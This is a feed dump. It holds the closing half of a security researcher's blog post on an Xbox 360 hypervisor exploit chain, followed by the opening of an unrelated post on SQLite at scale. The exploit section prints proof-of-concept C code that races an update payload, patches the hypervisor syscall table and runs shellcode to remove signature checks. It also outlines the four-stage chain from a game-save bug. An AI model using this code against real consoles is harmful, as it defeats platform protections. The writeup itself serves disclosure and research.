<p>Currently the oracle data (which was 16 bytes of 00s) was based on when the XKE payload did the in-place relocation of the LZX scratch buffer to encrypted memory and zero-initialized it. After the XKE payload initializes this memory it would verify the RSA signature on the compressed input data and decrypt it, before finally calling <code>LDICreateDecompression</code> which would fill the first 16 bytes of the LZX decoder structure with data. This gave a pretty large window of opportunity to observe the ciphertext for the oracle data but led to the attack window happening too early. I decided to change the oracle data to be the first 16 bytes of the LZX decoder structure after it was initialized by <code>LDICreateDecompression</code>, in hopes it would shift the attack window to the latter half of the decompression process.</p>



<p>The first 16 bytes of the LZX decoder structure is just a header with some constant values based on the parameters provided to <code>LDICreateDecompression</code>, so I could easily change the poc to generate the ciphertext for this data. You can see this change in lines 4-6 below:</p>



<div id="urvanov-syntax-highlighter-67c61f5b716ca487197768" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					
				</td>
						<td><div><p><span>// Get the cipher text for the expected header data in the LZX decoder context. This acts as our</span></p><p><span>// "oracle" to know when to start the race attack.</span></p><p><span>memset</span><span>(</span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span>,</span><span> </span><span>0</span><span>,</span><span> </span><span>16</span><span>)</span><span>;</span></p><p><span>*</span><span>(</span><span>ULONG</span><span>*</span><span>)</span><span>(</span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span> </span><span>+</span><span> </span><span>0</span><span>)</span><span> </span><span>=</span><span> </span><span>0x4349444c</span><span>;</span><span>		</span><span>// signature = 'CIDL'</span></p><p><span>*</span><span>(</span><span>ULONG</span><span>*</span><span>)</span><span>(</span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span> </span><span>+</span><span> </span><span>4</span><span>)</span><span> </span><span>=</span><span> </span><span>0x8000</span><span>;</span><span>			</span><span>// windows size = 0x8000</span></p><p><span>*</span><span>(</span><span>ULONG</span><span>*</span><span>)</span><span>(</span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span> </span><span>+</span><span> </span><span>8</span><span>)</span><span> </span><span>=</span><span> </span><span>1</span><span>;</span><span>				</span><span>// cpu type = 1</span></p><p><span>__dcbst</span><span>(</span><span>ScratchOffset</span><span>,</span><span> </span><span>pMemoryAddress</span><span>)</span><span>;</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>With the change in place I re-ran the poc a number of times and saw that the attack window had shifted to the latter half of the decompression process, and in some cases was winning the race on the last block of data. The poc was nearing completion, however, it was about this time that a new issue had popped up.</p>



<h2>Dirty Cache</h2>



<p>When testing the previous change there were a number of iterations where the race was supposedly won on the last block but the console would crash when trying to patch the hypervisor system call table. This could only happen if the block that was written to memory wasn’t the last block in the input file and the data being written over the <code>HvxFlushUserModeTb</code> system call wasn’t our stb/blr instruction sequence.</p>



<div id="urvanov-syntax-highlighter-67c61f5b716d2631555766" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>31</p><p>32</p><p>33</p><p>34</p><p>35</p><p>36</p><p>37</p><p>38</p><p>39</p><p>40</p><p>41</p><p>42</p><p>43</p><p>44</p><p>45</p><p>46</p><p>47</p><p>48</p><p>49</p><p>50</p><p>51</p><p>52</p><p>53</p><p>54</p><p>55</p><p>56</p></div>
				</td>
						<td><div><p><span>DWORD </span><span>RunUpdatePayloadThreadProc</span><span>(</span><span>THREAD_ARGS</span><span>*</span><span> </span><span>pArgs</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>.</span><span>.</span><span>.</span></p><p><span>	</span><span>// Get the cipher text at the location we want to overwrite and at an offset that is &gt; the size of block 14. This allows</span></p><p><span>	</span><span>// us to determine when we win the race on block 14 (smallest block in the file) vs any other block.</span></p><p><span>	</span><span>DWORD</span><span>*</span><span> </span><span>pCipherTextPtr1</span><span> </span><span>=</span><span> </span><span>(</span><span>DWORD</span><span>*</span><span>)</span><span>(</span><span>0xA0030000</span><span> </span><span>+</span><span> </span><span>HV_SEG3_OVERWRITE_OFFSET</span><span>)</span><span>;</span></p><p><span>	</span><span>DWORD</span><span>*</span><span> </span><span>pCipherTextPtr2</span><span> </span><span>=</span><span> </span><span>(</span><span>DWORD</span><span>*</span><span>)</span><span>(</span><span>0xA0030000</span><span> </span><span>+</span><span> </span><span>(</span><span>HV_SEG3_OVERWRITE_OFFSET</span><span> </span><span>-</span><span> </span><span>BLOCK_14_TARGET_OFFSET</span><span>)</span><span> </span><span>+</span><span> </span><span>BLOCK_14_SIZE</span><span> </span><span>+</span><span> </span><span>0x80</span><span>)</span><span>;</span></p><p><span>	</span><span>DWORD </span><span>cipherValue1</span><span> </span><span>=</span><span> </span><span>*</span><span>pCipherTextPtr1</span><span>;</span></p><p><span>	</span><span>DWORD </span><span>cipherValue2</span><span> </span><span>=</span><span> </span><span>*</span><span>pCipherTextPtr2</span><span>;</span></p><p><span>	</span><span>// Loop and hammer the payload until we hopefully get code exec.</span></p><p><span>	</span><span>while</span><span> </span><span>(</span><span>true</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>.</span><span>.</span><span>.</span></p><p><span>		</span><span>// Execute the payload.</span></p><p><span>		</span><span>DWORD </span><span>result</span><span> </span><span>=</span><span> </span><span>HvxKeysExecute</span><span>(</span><span>pArgs</span><span>-&gt;</span><span>PayloadPhys</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>PayloadSize</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>UpdateDataPhys</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>UpdateDataSize</span><span>,</span><span> </span><span>NULL</span><span>,</span><span> </span><span>NULL</span><span>)</span><span>;</span></p><p><span>		</span><span>// Flush cache on the cipher text pointers.</span></p><p><span>		</span><span>__dcbf</span><span>(</span><span>0</span><span>,</span><span> </span><span>pCipherTextPtr1</span><span>)</span><span>;</span></p><p><span>		</span><span>__dcbf</span><span>(</span><span>0</span><span>,</span><span> </span><span>pCipherTextPtr2</span><span>)</span><span>;</span></p><p><span>		</span><span>// Check if we got a block overwrite and if it appears to be block 14.</span></p><p><span>		</span><span>DWORD </span><span>test1</span><span> </span><span>=</span><span> </span><span>*</span><span>pCipherTextPtr1</span><span>;</span></p><p><span>		</span><span>if</span><span> </span><span>(</span><span>cipherValue1</span><span> </span><span>!=</span><span> </span><span>test1</span><span>)</span></p><p><span>		</span><span>{</span></p><p><span>			</span><span>// We got a block overwrite, check if it was block 14.</span></p><p><span>			</span><span>DWORD </span><span>test2</span><span> </span><span>=</span><span> </span><span>*</span><span>pCipherTextPtr2</span><span>;</span></p><p><span>			</span><span>if</span><span> </span><span>(</span><span>cipherValue2</span><span> </span><span>==</span><span> </span><span>test2</span><span>)</span></p><p><span>			</span><span>{</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>"Block 14 overwrite hit!\n"</span><span>)</span><span>;</span></p><p><span>				</span><span>// Overwrite the syscall function pointer for HvxPostOutput to point to a gadget that will jump to an arbitrary address.</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>" * Patching hv syscall table\n"</span><span>)</span><span>;</span></p><p><span>				</span><span>HvWriteULONG</span><span>(</span><span>HV_SYSCALL_POST_OUTPUT_ADDRESS</span><span>,</span><span> </span><span>HV_CALL_R4_GADGET_ADDRESS</span><span>)</span><span>;</span></p><p><span>				</span><span>// Try to execute our shell code which will restore the data we trashed in the last hypervisor segment and patch out</span></p><p><span>				</span><span>// the RSA signature checks on executable files.</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>" * Running payload\n"</span><span>)</span><span>;</span></p><p><span>				</span><span>result</span><span> </span><span>=</span><span> </span><span>HvxPostOutputExploit</span><span>(</span><span>0</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>ShellCodePhysAddress</span><span>)</span><span>;</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>" * Payload returned 0x%08x\n"</span><span>,</span><span> </span><span>result</span><span>)</span><span>;</span></p><p><span>				</span><span>DbgBreakPoint</span><span>(</span><span>)</span><span>;</span></p><p><span>			</span><span>}</span></p><p><span>			</span><span>else</span></p><p><span>			</span><span>{</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>"Race hit: 0x%08x\n"</span><span>,</span><span> </span><span>test1</span><span>)</span><span>;</span></p><p><span>			</span><span>}</span></p><p><span>			</span><span>// Save the latest block hit values.</span></p><p><span>			</span><span>cipherValue1</span><span> </span><span>=</span><span> </span><span>test1</span><span>;</span></p><p><span>			</span><span>cipherValue2</span><span> </span><span>=</span><span> </span><span>test2</span><span>;</span></p><p><span>		</span><span>}</span></p><p><span>	</span><span>}</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>After doing some introspection on my hacked console I was able to confirm that the block being written wasn’t the last block in the input file and that the ciphertext read from the <code>pCipherTextPtr2</code> pointer was stale. This basically meant that the latter portion of data being written to hypervisor memory was getting stuck in L2 cache and not being committed to RAM where it could be observed from kernel mode. This wasn’t a huge issue, it simply meant I had to find a cache flush primitive I could use to get this data committed to RAM.</p>



<h3>Finding a Cache Flush Primitive</h3>



<p>Finding a cache flush primitive isn’t too difficult, you mainly need to find a function that will process some data and cause what’s currently in L2 cache to age out. Any hypervisor function that meets the following criteria will work:</p>



<ul>
<li>Runs in hypervisor context. Kernel mode cannot flush cache lines that were allocated by hypervisor mode.</li>



<li>Runs with caching enabled. The hypervisor normally runs with caching disabled so we’ll need to find a function that enables caching before processing the data. Any function that operates on data using the encrypted pathway will do this.</li>



<li>Touches as much data as possible while also performing as little validation as possible.</li>
</ul>



<p>After looking through all the hypervisor functions that operate on encrypted memory I came across a system call called <code>HvxRevokeUpdate</code> that met the above criteria. This function is used to encrypt a console certificate revocation list using a per-console key. These revocation lists are used to blacklist console certificates that have been considered “compromised”. For example, if someone hacked their console and used their console certificate to sign malicious game saves (for hacking the console or cheating online), Microsoft could blacklist the console certificate used to sign them by adding it to the revocation list and distributing it over Xbox Live or in system updates. After it’s been revoked any game save signed by that console certificate will show up as “corrupted” and can’t be loaded.</p>



<p>For us this function is a great cache flush primitive because it operates on an input buffer up to 0x20000 bytes large in encrypted memory and performs no validation on the input data. We simply provide it an empty input buffer and once the hypervisor enables caching and touches this data from the encrypted pathway it’ll cause old data in L2 cache to be evicted. After including the cache flush primitive into the exploit poc I ended up with the following:</p>



<div id="urvanov-syntax-highlighter-67c61f5b716d7759369431" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>31</p><p>32</p><p>33</p><p>34</p><p>35</p><p>36</p><p>37</p><p>38</p><p>39</p><p>40</p><p>41</p><p>42</p><p>43</p><p>44</p><p>45</p><p>46</p><p>47</p><p>48</p><p>49</p><p>50</p><p>51</p><p>52</p><p>53</p><p>54</p><p>55</p><p>56</p><p>57</p><p>58</p><p>59</p><p>60</p><p>61</p><p>62</p><p>63</p><p>64</p></div>
				</td>
						<td><div><p><span>DWORD </span><span>RunUpdatePayloadThreadProc</span><span>(</span><span>THREAD_ARGS</span><span>*</span><span> </span><span>pArgs</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>// Allocate a scratch buffer to help with flushing L2 cache in hypervisor context.</span></p><p><span>	</span><span>BYTE</span><span>*</span><span> </span><span>pCacheFlushBuffer</span><span> </span><span>=</span><span> </span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>XPhysicalAlloc</span><span>(</span><span>0x20000</span><span>,</span><span> </span><span>MAXULONG_PTR</span><span>,</span><span> </span><span>0x10000</span><span>,</span><span> </span><span>PAGE_READWRITE</span><span> </span><span>|</span><span> </span><span>MEM_LARGE_PAGES</span><span>)</span><span>;</span></p><p><span>	</span><span>if</span><span> </span><span>(</span><span>pCacheFlushBuffer</span><span> </span><span>==</span><span> </span><span>NULL</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>DbgPrint</span><span>(</span><span>"Failed to allocate memory for cache flush buffer\n"</span><span>)</span><span>;</span></p><p><span>		</span><span>DbgBreakPoint</span><span>(</span><span>)</span><span>;</span></p><p><span>		</span><span>VdDisplayFatalError</span><span>(</span><span>0x12400</span><span> </span><span>|</span><span> </span><span>ERR_CACHE_FLUSH_BUFFER_OOM</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>ULONG </span><span>CacheFlushBufferPhys</span><span> </span><span>=</span><span> </span><span>MmGetPhysicalAddress</span><span>(</span><span>pCacheFlushBuffer</span><span>)</span><span>;</span></p><p><span>	</span><span>.</span><span>.</span><span>.</span></p><p><span>	</span><span>// Loop and hammer the payload until we hopefully get code exec.</span></p><p><span>	</span><span>while</span><span> </span><span>(</span><span>true</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>.</span><span>.</span><span>.</span></p><p><span>		</span><span>// Execute the payload.</span></p><p><span>		</span><span>DWORD </span><span>result</span><span> </span><span>=</span><span> </span><span>HvxKeysExecute</span><span>(</span><span>pArgs</span><span>-&gt;</span><span>PayloadPhys</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>PayloadSize</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>UpdateDataPhys</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>UpdateDataSize</span><span>,</span><span> </span><span>NULL</span><span>,</span><span> </span><span>NULL</span><span>)</span><span>;</span></p><p><span>		</span><span>// Flush cache on the cipher text pointers.</span></p><p><span>		</span><span>__dcbf</span><span>(</span><span>0</span><span>,</span><span> </span><span>pCipherTextPtr1</span><span>)</span><span>;</span></p><p><span>		</span><span>// Check if we got a block overwrite and if it appears to be block 14.</span></p><p><span>		</span><span>DWORD </span><span>test1</span><span> </span><span>=</span><span> </span><span>*</span><span>pCipherTextPtr1</span><span>;</span></p><p><span>		</span><span>if</span><span> </span><span>(</span><span>cipherValue1</span><span> </span><span>!=</span><span> </span><span>test1</span><span>)</span></p><p><span>		</span><span>{</span></p><p><span>			</span><span>// Flush cache on the secondary cipher text pointer. This one MUST be thorough or else we risk fetching stale data</span></p><p><span>			</span><span>// and trying to execute the post-block-write part of the exploit which will cause the console to hang.</span></p><p><span>			</span><span>HvxRevokeUpdate</span><span>(</span><span>CacheFlushBufferPhys</span><span>,</span><span> </span><span>0x20000</span><span>,</span><span> </span><span>0</span><span>)</span><span>;</span></p><p><span>			</span><span>__dcbf</span><span>(</span><span>0</span><span>,</span><span> </span><span>pCipherTextPtr2</span><span>)</span><span>;</span></p><p><span>			</span><span>// We got a block overwrite, check if it was block 14.</span></p><p><span>			</span><span>DWORD </span><span>test2</span><span> </span><span>=</span><span> </span><span>*</span><span>pCipherTextPtr2</span><span>;</span></p><p><span>			</span><span>if</span><span> </span><span>(</span><span>cipherValue2</span><span> </span><span>==</span><span> </span><span>test2</span><span>)</span></p><p><span>			</span><span>{</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>"Block 14 overwrite hit!\n"</span><span>)</span><span>;</span></p><p><span>				</span><span>// Overwrite the syscall function pointer for HvxPostOutput to point to a gadget that will jump to an arbitrary address.</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>" * Patching hv syscall table\n"</span><span>)</span><span>;</span></p><p><span>				</span><span>HvWriteULONG</span><span>(</span><span>HV_SYSCALL_POST_OUTPUT_ADDRESS</span><span>,</span><span> </span><span>HV_CALL_R4_GADGET_ADDRESS</span><span>)</span><span>;</span></p><p><span>				</span><span>// Try to execute our shell code which will restore the data we trashed in the last hypervisor segment and patch out</span></p><p><span>				</span><span>// the RSA signature checks on executable files.</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>" * Running payload\n"</span><span>)</span><span>;</span></p><p><span>				</span><span>result</span><span> </span><span>=</span><span> </span><span>HvxPostOutputExploit</span><span>(</span><span>0</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>ShellCodePhysAddress</span><span>)</span><span>;</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>" * Payload returned 0x%08x\n"</span><span>,</span><span> </span><span>result</span><span>)</span><span>;</span></p><p><span>				</span><span>DbgBreakPoint</span><span>(</span><span>)</span><span>;</span></p><p><span>			</span><span>}</span></p><p><span>			</span><span>else</span></p><p><span>			</span><span>{</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>"Race hit: 0x%08x\n"</span><span>,</span><span> </span><span>test1</span><span>)</span><span>;</span></p><p><span>			</span><span>}</span></p><p><span>			</span><span>// Save the latest block hit values.</span></p><p><span>			</span><span>cipherValue1</span><span> </span><span>=</span><span> </span><span>test1</span><span>;</span></p><p><span>			</span><span>cipherValue2</span><span> </span><span>=</span><span> </span><span>test2</span><span>;</span></p><p><span>		</span><span>}</span></p><p><span>	</span><span>}</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>Running the updated poc showed the cache flush primitive was working and the console was no longer crashing on false positives due to stale data in RAM. The only thing left to do now was assemble all the pieces of this exploit into a single chain that I would trigger using my favorite game exploit, Tony Hawk’s Pro Strcpy.</p>



<h2>Introducing the Xbox 360 Bad Update Exploit</h2>



<p>To turn this into an end-to-end exploit and get hypervisor code execution I’d use my <a href="https://icode4.coffee/?p=954" data-type="post" data-id="954">Tony Hawk’s Pro Strcpy</a> bug as an entry point and combine it with the techniques I developed for attacking this bootloader update XKE payload. Putting all of the pieces of the exploit together the full exploit chain would look like so:</p>



<ol>
<li>Stage 1
<ul>
<li>Using a modified game save file I would trigger the gap name strcpy bug in Tony Hawk’s American Wasteland (you can read about this bug in the <a href="https://icode4.coffee/?p=954" data-type="post" data-id="954">Tony Hawk’s Pro Strcpy</a> post) and get a ROP chain executing in kernel mode. This ROP chain would load a much larger ROP chain (stage 2) from a file on the HDD and pivot execution to it.</li>
</ul>
</li>



<li>Stage 2
<ul>
<li>The larger ROP chain would perform the operations needed to get arbitrary kernel mode code execution, and load stage 3 from a file on the HDD into the region of executable kernel memory.</li>
</ul>
</li>



<li>Stage 3
<ul>
<li>Stage 3 is the C code I wrote to run and attack the bootloader update XKE payload. This will perform the attack on the LZX decompression process to try and overwrite some hypervisor code and create an arbitrary write primitive. Using the arbitrary write primitive we’ll further modify hypervisor memory to get hypervisor code execution and run the stage 4 code in hypervisor mode.</li>
</ul>
</li>



<li>Stage 4
<ul>
<li>Stage 4 is assembly code I wrote that will undo all the memory corruption done to the hypervisor in stage 3 so it’s in a clean and stable state. After that it’ll patch out the RSA signature checks the hypervisor does on executable code so that unsigned executables can be run on the console.</li>



<li>Once complete stage 4 will return back to kernel mode and run an unsigned executable from the HDD thus proving the exploit worked.</li>
</ul>
</li>
</ol>



<p>While all the major pieces were already proven to work I still needed to chain them all together into a top-down exploit.</p>



<h2>A ROP Chain for the Record Books</h2>



<p>The technique I developed for getting arbitrary kernel mode code execution was done in C code that I could deploy and run on my hacked console. This code would need to be recreated in a ROP chain, and while the code itself wasn’t very complex doing it all in ROP wasn’t easy. It took about a week to rewrite the C code in ROP and the final chain consisted of 20-30 unique ROP gadgets and just over 28,000 links in the chain. I wrote many parts of the chain in reusable macros and split it across several source files to simplify the process, but even then the complexity of the chain is quite high.</p>



<figure><div>
<blockquote data-width="470" data-dnt="true"><p lang="en" dir="ltr">Almost out of ROP chain hell… Currently have 20 unique gadgets and 27,716 links in the chain. I implemented common functionality in macros which makes writing more complex aspects of the chain easier. Another day or so and I can move on to the third stage of the exploit (in C) <a href="https://t.co/uNpLKtlMGP">pic.twitter.com/uNpLKtlMGP</a></p>— Ryan M (@Grimdoomer) <a href="https://twitter.com/Grimdoomer/status/1838187355037167943?ref_src=twsrc%5Etfw">September 23, 2024</a></blockquote>
</div></figure>



<h2>The Grand Finale</h2>



<p>With everything in place there was one last thing to do. If you read my <a href="https://icode4.coffee/?p=954" data-type="post" data-id="954">Tony Hawk’s Pro Strcpy</a> blog post you might remember I used a homebrew <a href="https://www.youtube.com/watch?v=2yJgwwDcgV8">nyan cat</a> executable to test my exploits. It has since become somewhat of a signature for my exploits and while I had a version of this for the Xbox 360 ready to go, I decided to give it a small upgrade. After copying all the exploit files to a USB stick I booted up Tony Hawk’s American Wasteland, loaded my hacked game save, and waited. I knew from test runs on my hacked console that the exploit had a low success rate (around 35%) and could take upwards of 30 minutes to trigger, but I was ecstatic when it triggered on the first attempt in only a few minutes time. I now had an end-to-end hypervisor exploit that worked on the latest system software (version 17559) and could be triggered using software only methods.</p>



<figure><p>
<iframe loading="lazy" title="Xbox 360 Bad Update Exploit Demo" width="470" height="264" src="https://www.youtube.com/embed/WgmrW0Pfgl4?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>



<figure><div>
<blockquote data-width="470" data-dnt="true"><p lang="en" dir="ltr">As of today I have a fully working software only hypervisor exploit for the latest xbox 360 retail dashboard 17559 (should work on almost any software version though). Here's what you need to know…</p>— Ryan M (@Grimdoomer) <a href="https://twitter.com/Grimdoomer/status/1847497275289063676?ref_src=twsrc%5Etfw">October 19, 2024</a></blockquote>
</div></figure>



<p>Full source code and files for the exploit can be found on GitHub: <a href="https://github.com/grimdoomer/Xbox360BadUpdate" target="_blank" rel="noreferrer noopener">Xbox360BadUpdate</a>.</p>



<h2>Exploit F.A.Q.</h2>



<p>There are a couple questions I know people will be asking about the current state of the exploit, if a softmod is available, and how it compares to things like the RGH hack. I’ve provided answers to a few of these here.</p>



<ul>
<li><strong>What Xbox 360 software/kernel version does this exploit work on?</strong>
<ul>
<li>The exploit works on all software versions up to/through 17559, though there’s some version specific information that would need to be updated for any version other than 17559. At the time of writing this post I have reported the vulnerability to Microsoft but I don’t know if it will be patched in a future software update or not.</li>
</ul>
</li>



<li><strong>Does this mean a “softmod” is now available?</strong>
<ul>
<li>While the exploit is software only (no additional hardware or opening of the console required) it’s not persistent. You’ll need to rerun the exploit every time you turn the console on. Once the exploit runs your console will be in a hacked state until it’s rebooted/powered off. It works much the same as a tethered iOS jailbreak.</li>
</ul>
</li>



<li><strong>Can this be turned into a softmod/made persistent?</strong>
<ul>
<li>It’s theoretically possible to turn this into a persistent “softmod” but it wouldn’t be an ideal experience. The Xbox 360 boot chain is well protected and the only viable way to trigger the exploit on boot would be by finding a bug in the Xbox 360 dashboard, which may require additional input to trigger (ex: wait for dashboard to load, navigate to games list, scroll down, exploit triggers). <p>On top of this the Bad Update exploit can take up to 20 minutes to trigger and only has a ~35% success rate. Imagine every time you turn your console on, the dashboard loads, you have to navigate through a menu or two, then wait 20 minutes for the exploit to hopefully trigger, and if it doesn’t you have to reboot the console and start over until it works. Not a very good experience is it?</p></li>
</ul>
</li>



<li><strong>Why does the exploit take so long to trigger/can it be made faster/more reliable?</strong>
<ul>
<li>The exploit takes a while to trigger because it has to exploit a race condition under very specific circumstances. It may be possible to improve the timing/reliability but I don’t think it’ll ever be good enough to try and turn into a persistent hack.</li>
</ul>
</li>



<li><strong>Should I use this instead of the RGH hack?</strong>
<ul>
<li>No, this exploit does not provide a good user experience for those wanting to hack their Xbox 360 consoles. RGH is, and always will be the defacto boot-to-hacked-state exploit for the console.</li>
</ul>
</li>
</ul>



<h2>Conclusion</h2>



<p>This exploit took around two and half months to research, develop, and finish but it felt like an eternity. There were many times I thought I hit a dead end and had no path forward, only to spend a day or two thinking and coming up with something new to try. Finding and developing this exploit pushed my abilities as a security researcher, from understanding how the console worked, to finding ways to create attack surface when there otherwise wasn’t any, to using anything and everything I possibly could to help win the race condition and (quite literally) beat the CPU into submission. The constant need to think outside the box and turn nothing into something is part of what I love about being a security researcher, but it’s also exhausting.</p>



<p>Now that I’ve completed this exploit I’m going to retire from game console hacking (at least for the foreseeable future). I’ve learned all I wanted to learn and hacked all I wanted hacked, now it’s time I explore some new avenues. I want to give a big shout out to everyone who encouraged me to continue working on this through all the ups and downs, doom, “x”, and the Seabards for listening to all my rambling about L2 cache fuckery and the numerous times I thought I hit a dead end. Once again, a big thank you to everyone who read through this wall of text. Even though it’s quite long this blog post doesn’t even begin to capture all the work that made this exploit possible.</p>



<p>For anyone who wants to read more about the Xbox 360 inner workings I plan to write a part 3 where I’ll (briefly) cover some of my failed attempts at exploiting the console, and other interesting behavior/techniques I developed along the way. However, this part won’t be written for several months time so don’t count on it any time soon.</p>




									
																		
								</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[SQLite-on-the-Server Is Misunderstood: Better at Hyper-Scale Than Micro-Scale (112 pts)]]></title>
            <link>https://rivet.gg/blog/2025-02-16-sqlite-on-the-server-is-misunderstood</link>
            <guid>43244307</guid>
            <pubDate>Mon, 03 Mar 2025 17:29:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://rivet.gg/blog/2025-02-16-sqlite-on-the-server-is-misunderstood">https://rivet.gg/blog/2025-02-16-sqlite-on-the-server-is-misunderstood</a>, See on <a href="https://news.ycombinator.com/item?id=43244307">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><img blurwidth="8" blurheight="4" alt="Promo Image" loading="lazy" width="2334" height="1024" decoding="async" data-nimg="1" src="https://rivet.gg/_next/static/media/image.f86d756a.png">
<p>We're Rivet, a new open-source, self-hostable serverless platform. We've been in the weeds with SQLite-on-the-server recently and – boy – do we have a lot of thoughts to share. <a href="https://github.com/rivet-gg/rivet">Give us a star on GitHub</a>, we'll be sharing a lot more about SQLite soon!</p>
<p>There's been <a href="https://lobste.rs/s/t1enph/siren_call_sqlite_on_server">a lot of discussion</a> recently about the pros and cons of SQLite on the server. After reading many of these conversations, I realized that my perspective on the power of SQLite-on-the-server is lopsided from popular opinion: SQLite's strengths really shine at scale, instead of with small hobbyist deployments that it's frequently referenced in.</p>
<hr>
<p>Before jumping in to my perspective on the benefits of SQLite at scale, it's helpful to understand some background on SQLite-on-the-server for micro-scale apps.</p>

<img loading="lazy" width="2500" height="1786" decoding="async" data-nimg="1" src="https://rivet.gg/_next/static/media/sqlite-microscale.5d171f3e.png">
<p>Most developers consider server-side SQLite a simple, cost-effective choice for small-scale applications. It's often valued for:</p>
<ul>
<li><strong>Low infrastructure costs</strong>: No need for separate database servers—just a single file.</li>
<li><strong>Seamless development and testing</strong>: The same database file can be used across client and server.</li>
<li><strong>Minimal management overhead</strong>: No complex configurations or database daemons.</li>
<li><strong>Proven reliability</strong>: It's been around forever. It's the <a href="https://www.sqlite.org/mostdeployed.html">world's most widely deployed database</a> and <a href="https://hackernoon.com/the-story-of-dwayne-richard-hipp-and-the-development-of-sqlite-in-1999-yc4v356q">built to withstand battleships getting blown to bits</a>.</li>
</ul>
<p>These characteristics make SQLite an attractive option for personal projects, lightweight applications, and prototypes.</p>

<p>Tools like <a href="https://github.com/superfly/litefs">LiteFS</a>, <a href="https://litestream.io/">Litestream</a>, <a href="https://github.com/rqlite/rqlite">rqlite</a>, <a href="https://dqlite.io/">Dqlite</a>, and <a href="https://bedrockdb.com/">Bedrock</a> enhance SQLite with replication and high availability for micro-scale deployments.</p>
<p>However, this post focuses on <a href="https://developers.cloudflare.com/durable-objects/get-started/tutorial-with-sql-api/">Cloudflare Durable Objects</a> and <a href="https://turso.tech/">Turso</a> to highlight the often-overlooked advantages of SQLite at scale.</p>
<hr>
<img loading="lazy" width="1934" height="2178" decoding="async" data-nimg="1" src="https://rivet.gg/_next/static/media/cassandra.bb9addd0.png">
<p>In high-scale systems, companies frequently struggle scaling databases like <a href="https://www.postgresql.org/">Postgres</a> or <a href="https://www.mysql.com/">MySQL</a>. Instead, they often turn to sharded databases such as <a href="https://cassandra.apache.org/">Cassandra</a>, <a href="https://www.scylladb.com/">ScyllaDB</a>, <a href="https://aws.amazon.com/dynamodb/">DynamoDB</a>, <a href="https://vitess.io/">Vitess</a> (sharded MySQL), and <a href="https://www.citusdata.com/">Citus</a> (sharded Postgres).</p>
<p>These systems use partitioning keys to co-locate related &amp; similarly structured data. For example, a typical chat application on Cassandra might define:</p>

<p>To query messages from this partition, you could write:</p>


<p>Sharded databases power almost every large tech company because they provide:</p>
<ul>
<li>Efficient batch reads with data grouped in the same partition.</li>
<li>Horizontal scalability by partitioning data across nodes.</li>
<li>Optimized writes for high-ingestion workloads</li>
</ul>


<p>While partitioning strategies improve scalability, they introduce significant challenges:</p>
<ul>
<li><strong>Rigid schemas</strong>: Unlike Postgres or MySQL, the schema must exactly match the intended query patterns exactly, limiting flexibility.</li>
<li><strong>Complex schema changes</strong>: Adding a new index or relation requires significant operational overhead to create &amp; populate a new table in a live system.</li>
<li><strong>Complex cross-partition operations</strong>: Enforcing ACID properties across partitions is difficult. Companies often resort to complicated <a href="https://en.wikipedia.org/wiki/Two-phase_commit_protocol">two-phase commits</a> or design with an acceptable level of data inconsistency.</li>
<li><strong>Data inconsistency</strong>: Without strong constraints between tables &amp; partitions, data frequently becomes "dirty" because of interrupted transactions or failure to propagate changes.</li>
</ul>
<hr>
